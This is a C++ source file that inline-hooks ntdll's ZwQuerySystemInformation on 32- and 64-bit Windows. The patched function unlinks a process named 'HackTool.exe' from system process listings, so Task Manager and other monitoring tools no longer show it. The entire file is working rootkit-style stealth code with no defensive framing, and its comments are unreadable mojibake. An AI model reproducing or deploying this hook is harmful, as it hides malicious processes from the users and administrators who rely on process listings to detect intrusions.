#include "pch.h"
#include "CHideProcess.h"

typedef NTSTATUS(WINAPI* typedef_ZwQuerySystemInformation)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                     SystemInformation,
	_In_      ULONG                      SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength);

BYTE g_oldcode32_ZwQ[5] = { 0 };
BYTE g_oldcode64_ZwQ[12] = { 0 };


// ����InlineHook
void OnInlineHook()
{
	// 1.��ȡ������ַ
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");

	// 32λ�޸�5���ֽڣ�64λ�޸�12���ֽ�
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// ������λ��e9 _dwOffset(��תƫ��)
	//          addr1 --> jmp _dwNewAddressָ�����һ��ָ��ĵ�ַ����eip��ֵ
	//          addr2 --> ��ת��ַ��ֵ����_dwNewAddress��ֵ
	//          ��תƫ�� _dwOffset = addr2 - addr1
	BYTE g_newcode[5] = { 0xE9 };
	// 2. ����ԭʼָ��5���ֽ�
	memcpy(g_oldcode32_ZwQ, ZwQuerySystemInformation, 5);

	// 3. ������תƫ�ƣ�������ת newcode[5]
	// ��תƫ��  = Ŀ���ַ - ָ������- ָ���
	DWORD dwOffset = (DWORD)MyZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	*(DWORD*)(g_newcode + 1) = dwOffset;
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// �������ǣ�
	//      48 b8 8877665544332211
	//      ff e0
	BYTE g_newcode[12] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 };
	// 2. ����ԭʼָ��12���ֽ�
	memcpy(g_oldcode64_ZwQ, ZwQuerySystemInformation, 12);
	// 3. ������ת newcode[12]
	ULONGLONG dwOffset = (ULONGLONG)MyZwQuerySystemInformation;
	*(ULONGLONG*)(g_newcode + 2) = dwOffset;
#endif // !_WIN64

	// 4. д����תƫ��
	// �޸�Ŀ��ҳ����
	DWORD dwOldProtect;
	VirtualProtect(ZwQuerySystemInformation, sizeof(g_newcode), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// �޸�MessageBoxWָ��ǰ5���ֽ�
	memcpy(ZwQuerySystemInformation, g_newcode, sizeof(g_newcode));
	// �ָ�ҳ����
	VirtualProtect(ZwQuerySystemInformation, sizeof(g_newcode), dwOldProtect, &dwOldProtect);
}


// �ر�InlineHook
void UnInlineHook()
{
	// ��ԭMessageBoxWǰ5���ֽ�
	// 1.��ȡ������ַ
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");

	// 2.��ԭָ��ǰ5�ֽ�
	// �޸�Ŀ��ҳ����
	DWORD dwOldProtect;
	VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 32λ�»�ԭǰ5�ֽڣ�64λ�»�ԭǰ12�ֽ�
#ifndef _WIN64
	// �޸ĺ���ָ��ǰ5���ֽ�
	memcpy(ZwQuerySystemInformation, g_oldcode32_ZwQ, 5);
#else
	// �޸ĺ���ָ��ǰ12���ֽ�
	memcpy(ZwQuerySystemInformation, g_oldcode64_ZwQ, 12);
#endif  // !_WIN64

	// �ָ�ҳ����
	VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}

// hook����´���
//�ر�ע��Ҫ���ϵ��÷�ʽ WINAPI
NTSTATUS WINAPI MyZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
)
{
	NTSTATUS status = 0;

	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;

	// Ҫ���صĽ�����
	wchar_t dwHideProcessName[MAX_PATH] = L"HackTool.exe";

	// ж�ع���
	UnInlineHook();

	// 1.��ȡ������ַ
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation =
		(typedef_ZwQuerySystemInformation)GetProcAddress(hModule, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}
	// ����ԭ���� ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);
	//  ����Ǽ���ϵͳ�Ľ�����Ϣ���ҵ���ԭ�����ɹ�
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// �ж��Ƿ���Ҫ���صĽ���PID
			// �����Ҫ���صĽ���PID
			if (lstrcmp(pCur->ImageName.Buffer, dwHideProcessName) == 0)
			{
				if (0 == pCur->NextEntryOffset)
				{
					//��������Ҫ���صĽ��������һ������ʱ
					//�ͽ���һ�����ݽṹ��NextEntryOffset��0
					//��ʱϵͳ�ڱ������ǽ���ʱ�Ͳ��ᷢ����
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					//��������Ҫ���صĽ��� ���滹�н���ʱ
					//Խ��Ҫ���صĽ����� NextEntryOffset 
					//ָ����һ�����ݿ�
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
				//���PID�Ƚ�ʱ������ǧ��Ҫȥ��
				break;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pPrev = pCur;
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	//���ù���
	OnInlineHook();

	return status;
}